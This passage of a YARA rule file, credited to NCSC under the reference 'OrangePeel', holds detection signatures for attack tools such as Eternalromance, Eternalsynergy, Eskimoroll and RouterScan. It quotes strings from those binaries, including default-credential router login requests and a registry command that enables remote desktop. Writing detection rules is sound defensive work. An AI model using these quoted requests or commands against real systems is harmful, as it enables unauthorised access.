      $x17 = "[-] build_egg1_callback_x86(): Failed to read CallbackPayloadDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x18 = "[-] build_egg1_callback_x64(): Failed to package up CallbackPayloadDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x19 = "[-] build_egg1_callback_x86(): Failed to package up CallbackPayloadDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x20 = "[-] build_egg1_callback_x64(): Failed to read MigrateProcessDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "c045461c233a54b077e4324f85ca6c72" and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_file_72008 {
   meta:
      description = "72008.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "4b16cb8b0eaeb8449d35290edb00beb3002852ad0225f52e5476e16c853447c5"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "impacket.system_errors(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s5 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s7 = "opyi-windows-manifest-filename 72008.exe.manifest" fullword ascii /* PEStudio Blacklist: os */ /* score: '21.00'*/
      $s8 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s9 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s10 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s13 = "b72008.exe.manifest" fullword ascii /* PEStudio Blacklist: os */ /* score: '20.00'*/
      $s14 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s15 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s16 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s17 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s18 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s19 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s20 = "Could not get __main__ module's dict." fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 14000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}


rule NCSC_file_82012 {
   meta:
      description = "82012.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "36e9c95b65692b110f4fe2ed27aa6066368c07525c020ec081b59bad272e6172"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "impacket.system_errors(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s5 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s7 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s9 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s10 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s11 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s12 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s14 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s15 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s16 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s17 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s18 = "Could not get __main__ module's dict." fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s19 = "Cannot GetProcAddress for PyMarshal_ReadObjectFromString" fullword ascii /* score: '17.00'*/
      $s20 = "impacket.dcerpc.v5.transport(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 14000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_PsExec64 {
   meta:
      description = "PsExec64.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "ad6b98c01ee849874e4b4502c3d7853196f6044240d3271e4ab3fc6e3c08e9a4"
   strings:
      $s1 = "These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please rea" wide /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s2 = "The software is subject to United States export laws and regulations.You must comply with all domestic and international export " wide /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s3 = "* use the software for commercial software hosting services." fullword wide /* score: '29.00'*/
      $s4 = "* anything related to the software, services, content(including code) on third party Internet sites, or third party programs; an" wide /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s5 = "\\caps\\fs20 6.\\tab\\fs19 Export Restrictions\\caps0 .\\b0   The software is subject to United States export laws and regulatio" ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s6 = "-Nano Server does not support -i or -x option." fullword wide /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s7 = "The software is licensed \"as - is.\" You bear the risk of using it.Sysinternals gives no express warranties, guarantees or cond" wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s8 = "sNtdll.dll" fullword wide /* score: '23.00'*/
      $s9 = "process state" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s10 = "bec, Canada, certaines des clauses dans ce contrat sont fournies ci - dessous en fran" fullword wide /* score: '22.00'*/
      $s11 = "User key container with default name does not exist. Try create one." fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s12 = "Software\\Microsoft\\windows nt\\currentversion" fullword wide /* PEStudio Blacklist: os */ /* score: '21.00'*/
      $s13 = "\\pard\\fi-357\\li357\\sb120\\sa120\\tx360\\b\\fs20 3.\\tab SENSITIVE INFORMATION. \\b0  Please be aware that, similar to other " ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s14 = " au logiciel, aux services ou au contenu(y compris le code) figurant sur des sites Internet tiers ou dans des programmes tiers; " wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s15 = "This is the first run of this program. You must accept EULA to continue." fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s16 = "This agreement, and the terms for supplements, updates, Internet - based services and support services that you use, are the ent" wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s17 = "ril.Sysinternals n'accorde aucune autre garantie expresse. Vous pouvez b" fullword wide /* score: '19.00'*/
      $s18 = "pipe connection complete" fullword wide /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s19 = "clamations au titre de violation de contrat ou de garantie, ou au titre de responsabilit" fullword wide /* score: '19.00'*/
      $s20 = "Machine key container with default name does not exist. Try create one." fullword wide /* PEStudio Blacklist: strings */ /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 1000KB and
        pe.imphash() == "159d56d406180a332fbc99290f30700e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_pscan24 {
   meta:
      description = "pscan24.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "dbddacfdec2b53b074ad750a113de61999d78843d28af3ee18f2d106e045baaa"
   strings:
      $x1 = "try { oFilesystem.MoveFile( s, d ); } catch( err ) {}SetARPINSTALLLOCATIONARPINSTALLLOCATION[ACTUAL_APPFOLDER]ai_CloseAIPSRaClos" ascii /* PEStudio Blacklist: strings */ /* score: '71.00'*/
      $x2 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii /* PEStudio Blacklist: strings */ /* score: '69.00'*/
      $x3 = "Z:\\out\\Release\\NetUtils\\x86\\aps_wix_install_dll.pdb" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x4 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x5 = "windowsprintersupport.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x6 = "advanced_port_scanner_console.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x7 = "advanced_port_scanner.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s8 = "var sHome = oShell.ExpandEnvironmentStrings( \"%USERPROFILE%\" );" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01'*/
      $s9 = "OnlineHelpUrlhttp://www.advanced-ip-scanner.com/link.php?lng=de&ver=2-4-2750&beta=n&page=helpProductCode{89D32223-C559-478D-A7F3" ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s10 = "Instructs Setup to load the settings from the specified file after having checked the command line." fullword wide /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s11 = "regDC853F02D327CFF1A2C440C9A0D2C2FCzh_cns_helpn-ew3aub.sho|Advanced Port Scanner " fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.42'*/
      $s12 = "Advanced Port Scanner.regDC853F02D327CFF1A2C440C9A0D2C2FCel_grs_helpn-ew3aub.sho|" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s13 = ".regDC853F02D327CFF1A2C440C9A0D2C2FCtr_trs_helpn-ew3aub.sho|Advanced Port Scanner K" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s14 = "BregDC853F02D327CFF1A2C440C9A0D2C2FCja_jps_helpn-ew3aub.sho|Advanced Port Scanner" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s15 = "aps_wix_install_dll.dll" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s16 = "d = sHome + \"\\\\advanced_ip_scanner_Favorites.bin.bak\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s17 = "s = sHome + \"\\\\advanced_ip_scanner_Favorites.bin.bak\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s18 = "OnlineHelpUrlhttp://www.advanced-ip-scanner.com/link.php?lng=nl&ver=2-4-2750&beta=n&page=helpProductCode{063E8643-E045-4E8C-857C" ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s19 = "OnlineHelpUrlhttp://www.advanced-ip-scanner.com/link.php?lng=tr&ver=2-4-2750&beta=n&page=helpProductCode{8668D113-027D-4023-8F17" ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s20 = "$http://www.advanced-port-scanner.com0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 26000KB and
        pe.imphash() == "48aa5c8931746a9655524f67b25a47ef" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}


rule NCSC_CheckAccount {
   meta:
      description = "CheckAccount.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "a12dd0a606d936e7d61d5125d2aa5d0ee272de36e8d193f52de0ad008ccf2c8b"
   strings:
      $x1 = "CheckAccount.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s2 = "Microsoft.Exchange.WebServices.Data" fullword ascii /* score: '17.00'*/
      $s3 = "txtPasswords" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s4 = "Check Passwords..." fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s5 = "Microsoft.Exchange.WebServices" fullword ascii /* score: '12.00'*/
      $s6 = "Text files|*.txt" fullword wide /* score: '12.00'*/
      $s7 = "Connections:" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s8 = "CheckAccount" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s9 = "lblConnections" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s10 = "nudConnections" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s11 = "txtAccounts" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s12 = "set_AcceptGzipEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.01'*/
      $s13 = "ExchangeCredentials" fullword ascii /* score: '10.00'*/
      $s14 = "WebCredentials" fullword ascii /* score: '9.00'*/
      $s15 = "Check Usernames..." fullword wide /* PEStudio Blacklist: strings */ /* score: '8.00'*/
      $s16 = "btnStart" fullword wide /* PEStudio Blacklist: strings */ /* score: '8.00'*/
      $s17 = "ExchangeServiceBase" fullword ascii /* score: '8.00'*/
      $s18 = "ExchangeVersion" fullword ascii /* score: '7.00'*/
      $s19 = "ExchangeService" fullword ascii /* score: '7.00'*/
      $s20 = "WellKnownFolderName" fullword ascii /* score: '5.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 60KB and
        ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule NCSC_RouterScan {
   meta:
      description = "RouterScan.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "37ba91b1e939d4aaa1c6822fd039f8f00e74379afa142958149200e41351e3d5"
   strings:
      $x1 = "thispage=index.htm&Users.UserName=admin&Users.Password=admin&button.login.Users.deviceStatus=Login&Login.userAgent=" fullword wide /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x2 = "XML 2003 Table|*.xml|CSV Table|*.csv|Plain Text (tab - separator)|*.txt|IP:Port List|*.lst|JavaScript Object Notation|*.json" fullword wide /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x3 = "GET /Tools/tools_admin.xgi?GET/sys/account/superUserPassword=1 HTTP/1.0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.01'*/
      $x4 = "Process p = Runtime.getRuntime().exec(\"" fullword wide /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x5 = "<p>Type in an arbitrary <a href=\"http://groovy.codehaus.org/Home\">Groovy script</a> and execute it on the server." fullword wide /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x6 = "Welcome to <a href=\"http://www.sqlitemanager.org\" target=\"_blank\">SQLiteManager</a>" fullword wide /* PEStudio Blacklist: strings */ /* score: '37.01'*/
      $x7 = "/html/login.cgi?Username=admin&Password=&Language=0&RequestFile=html/content.asp" fullword wide /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x8 = "<a href=\"http://www.dlink.com\" target=_blank>" fullword wide /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x9 = "dThis \"Portable Network Graphics\" image contains an unknown critical part which could not be decoded.pThis \"Portable Network " wide /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x10 = "GET /Tools/tools_admin.xgi?GET/sys/account/superUserName=1 HTTP/1.0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.01'*/
      $x11 = "/cli.cgi?cmd=$sys_user1%;$lan_ip%;$lan_msk%;status%20wan_ip%;status%20wan_mask%;status%20wan_gw%;status%20dns1%;status%20dns2%;" fullword wide /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x12 = "C:\\Builds\\TP\\indysockets\\lib\\Protocols\\IdSSLOpenSSLHeaders.pas" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x13 = "frmSub.action=\"cgi-bin/wlogin.cgi\"" fullword wide /* PEStudio Blacklist: strings */ /* score: '32.17'*/
      $x14 = "/index.php?page=master&menu1=Configuration&menu2=Wireless&menu3=Basic?page=master&menu1=Monitoring&menu2=System&menu3=System" fullword wide /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x15 = "thispage=index.htm&USERDBUsers.UserName=admin&USERDBUsers.Password=admin&button.login.USERDBUsers.deviceStatus=Login&Login.userA" wide /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x16 = "name=\"login:command/password\" value=\"Admin\"" fullword wide /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x17 = "Executables|*.exe" fullword wide /* score: '32.00'*/
      $x18 = "<get inst=\"wireless_ap-0\"><key>wpa_password</key><value/></get>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x19 = "\"http://support.dlink.com.tw/\"  onclick=\"return jump_if();\"" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.42'*/
      $x20 = "/login.cgi?username=admin&password=admin&sessionKey=" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 10000KB and
        pe.imphash() == "0328992e3d8fd04de0c04bf8a7f2b4cd" and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_guest_x64 {
   meta:
      description = "guest.x64.bin"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "762613eb75d34f190034ac9e7e369fc5bc85dcb17ba4333ee8b3f37a0b743f5e"
   strings:
      $x1 = "cmd /c reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f & " ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $s2 = "AWAVWVSPL" fullword ascii /* score: '6.50'*/
      $s3 = "USWVAWI" fullword ascii /* score: '5.50'*/
      $s4 = "AQAPRQVH1" fullword ascii /* score: '5.00'*/
      $s5 = "QRAPAQARAS1" fullword ascii /* score: '5.00'*/
   condition:
      ( uint16(0) == 0xe855 and
        filesize < 4KB and
        ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule NCSC_Eternalromance_1_3_0 {
   meta:
      description = "Eternalromance-1.3.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
   strings:
      $x1 = "[-] Error: Exploit choice not supported for target OS!!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x2 = "[+] Connection to target successfully established!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x3 = "Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x4 = "[-] STATUS_LOGON_FAILURE returned (invalid credentials)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x5 = "[+] Target %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x6 = "[*] Connections closed, exploit method %d unsuccessful" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.01'*/
      $x7 = "[-] Error setting Payload - invalid entry" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x8 = "[-] Error - Unsupported pipe name" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x9 = "[-] Error getting Payload" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x10 = "[+] Backdoor shellcode written" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x11 = "[+] Ping returned Target architecture: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $x12 = "[-] Error: Backdoor not present on target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s13 = "[-] Unable to successfully takeover a transaction in %d attempts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s14 = "[+] Backdoor already exists!!! Skipping exploitation" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s15 = "[-] Error getting Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s16 = "***********    TARGET ARCHITECTURE IS X64    ************" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s17 = "[-] Unable to find transaction in %d attempts, aborting" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s18 = "[*] Attempting exploit method %d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.01'*/
      $s19 = "[*] Attempting to find remote SRV module" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s20 = "[-] Unable to find transaction in %d attempts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "bf048a2895aab51a00a0c0b2c3c0987a" and
        ( 1 of ($x*) or all of them )
      ) or ( all of them )
}

rule NCSC_Eternalsynergy_1_0_1 {
   meta:
      description = "Eternalsynergy-1.0.1.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
   strings:
      $x1 = "[-] Error setting ShellcodeFile name" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x2 = "[+] Target %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x3 = "[-] Connections closed, exploit method %d unsuccessful" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.01'*/
      $x4 = "[-] Error - Unsupported pipe name" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x5 = "[+] Backdoor shellcode written" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x6 = "[+] ProcessListEntry.Blink: %I64X" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s7 = "[-] Unable to successfully takeover a transaction in %d attempts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s8 = "[+] Rpc bind found target is x%s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s9 = "[+] KProcess: %I64X" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s10 = "[-] Error getting Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s11 = "[*] Attempting exploit method %d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.01'*/
      $s12 = "[*] Attempting to find remote SRV module" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s13 = "[*] Copying code to target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s14 = "[-] Error in %s (%s line %d): Invalid retry count (%d), must be less than (%d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s15 = "[-] Leak attempt %d unsuccessful" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s16 = "[-] Overwrite caused target to not respond, most likely blue screened" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s17 = "[-] Error in %s (%s line %d): Out of range write not possible. WriteOffset %X > %X (Offset to Trans: %X)" fullword ascii /* score: '26.00'*/
      $s18 = "[+] TargetOsArchitecture: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s19 = "ErrorUnknownPrintProcessor" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s20 = "WsaErrorTooManyProcesses" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 600KB and
        pe.imphash() == "3435b3edce1e9970229bc56e4dd4d3ce" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_orange32 {
   meta:
      description = "orange32.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "d1ee0cf551e5fc37d482484d3de1c5718a5b8c9cfadd907b7b3ccf9324a599fe"
   strings:
      $s1 = "orange.exe" fullword wide /* score: '22.00'*/
      $s2 = "ange.exe" fullword ascii /* score: '21.00'*/
      $s3 = "svchost" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s4 = "Porteghal" fullword wide /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s5 = "orangeteghal" fullword wide /* score: '13.00'*/
      $s6 = "eyToken=" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00'*/
      $s7 = "File is invalid." fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s8 = "OrangeTeghal" fullword wide /* score: '9.00'*/
      $s9 = "6SW9TK>- " fullword ascii /* score: '8.42'*/
      $s10 = "!It's .NET EXE$@" fullword ascii /* score: '8.00'*/
      $s11 = "Runtim" fullword ascii /* score: '8.00'*/
      $s12 = ": ?* ?F0" fullword ascii /* score: '7.00'*/
      $s13 = "ademark" fullword ascii /* score: '7.00'*/
      $s14 = "mpress" fullword ascii /* score: '7.00'*/
      $s15 = "trings" fullword ascii /* score: '7.00'*/
      $s16 = "yqmpon" fullword ascii /* score: '7.00'*/
      $s17 = "WdExrUnB" fullword ascii /* score: '6.00'*/
      $s18 = "SUGNIU" fullword ascii /* score: '5.50'*/
      $s19 = "ERUMFJGW" fullword ascii /* score: '5.50'*/
      $s20 = "MPRESS" fullword wide /* score: '5.50'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 3000KB and
        ( 6 of them )
      ) or ( all of them )
}

rule NCSC_Eskimoroll_1_1_1 {
   meta:
      description = "Eskimoroll-1.1.1.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "0989bfe351342a7a1150b676b5fd5cbdbc201b66abcb23137b1c4de77a8f61a6"
   strings:
      $s1 = "[-] Could not configure the service ticket request" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s2 = "Password has expired - change password to reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s3 = "Server not found in Kerberos database (e.g., bad TargetMachine)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s4 = "[*] TargetMachine name longer than 15 characters!  Shortening..." fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s5 = "[+] \"TargetPort\"      %hu" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s6 = "[-] Could not configure first TGT request" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s7 = "[+] Closed KDC connection" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "[-] MesEncodeValidationInformation failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s9 = "[+] \"TargetMachine\"   %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s10 = "[+] \"TargetIp\"        %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "tibe-2.dll" fullword ascii /* score: '20.00'*/
      $s12 = "esco-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "adfw-2.dll" fullword ascii /* score: '20.00'*/
      $s14 = "adfw_setProcess" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s15 = "Requested protocol version number not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s16 = "HexDumpShort" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s17 = "Client not found in Kerberos database (e.g., bad Username)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s18 = "[-] RET_ERROR_AUTHFAILED(1:0x%x): %s" fullword ascii /* score: '17.02'*/
      $s19 = "[+] \"KerberosTicket\"  [%d bytes]" fullword ascii /* score: '17.00'*/
      $s20 = "PasswordHash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 80KB and
        pe.imphash() == "bd30e2c890dd3bee09056fba096751e7" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_Easybee_1_0_1 {
